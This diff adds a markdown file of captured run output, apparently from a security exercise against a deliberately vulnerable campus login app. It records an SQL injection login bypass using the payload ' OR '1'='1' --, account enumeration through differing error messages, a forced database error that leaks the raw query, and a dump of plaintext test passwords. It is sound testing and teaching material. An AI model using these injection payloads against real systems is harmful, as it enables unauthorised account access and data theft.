@@ -1,0 +1,48 @@
+# Task 2 — captured run output (Fri Jul 31 12:17:31 WCAST 2026)
+
+## SQLi auth bypass (node tests/sqli-login.mjs)
+```
+Attempting login WITHOUT valid credentials, using SQLi payload:
+  email    = "' OR '1'='1' -- "
+  password = "irrelevant"
+
+HTTP status: 200
+Response body: {"ok":true,"user":{"id":1,"email":"ada.learner@campus.local","role":"student"}}
+Set-Cookie: [
+  'sid=a74f9d57-5276-461c-a80e-28a720ee05e4; Path=/; HttpOnly; Max-Age=86400'
+]
+
+[BYPASS CONFIRMED] Logged in as ada.learner@campus.local (role=student) with no valid password — the login query is injectable.
+```
+
+## Enumeration + verbose errors (node tests/enum-and-verbose.mjs)
+```
+1) Unknown email vs known email — the messages differ (enumeration):
+
+  unknown email  -> 401 {"error":"No account exists with that email address."}
+  known email    -> 401 {"error":"Incorrect password for that account."}
+
+  => Distinct 'No account…' vs 'Incorrect password…' replies confirm the app leaks which accounts exist.
+
+2) Malformed injection to force a DB error (verbose stack/query leak):
+
+  status: 500
+  body keys: [ 'error', 'stack', 'query' ]
+  => Response includes a raw SQL 'query' and/or 'stack' field:
+     query: SELECT p.id, p.email, p.role, p.display_name FROM profiles p JOIN credentials c ON c.profile_id = p.id WHERE p.email = '' AND 1=CAST('x' AS int) -- ' AND c.password = 'x'
+```
+
+## Plaintext passwords (psql)
+```
+           email           |   password    
+---------------------------+---------------
+ ada.learner@campus.local  | ada-pw-2025
+ grace.coder@campus.local  | grace-pw-2025
+ linus.pupil@campus.local  | linus-pw-2025
+ mira.scholar@campus.local | mira-pw-2025
+ otto.student@campus.local | otto-pw-2025
+ nova.trainee@campus.local | nova-pw-2025
+ admin@campus.local        | admin123
+(7 rows)
+
+```
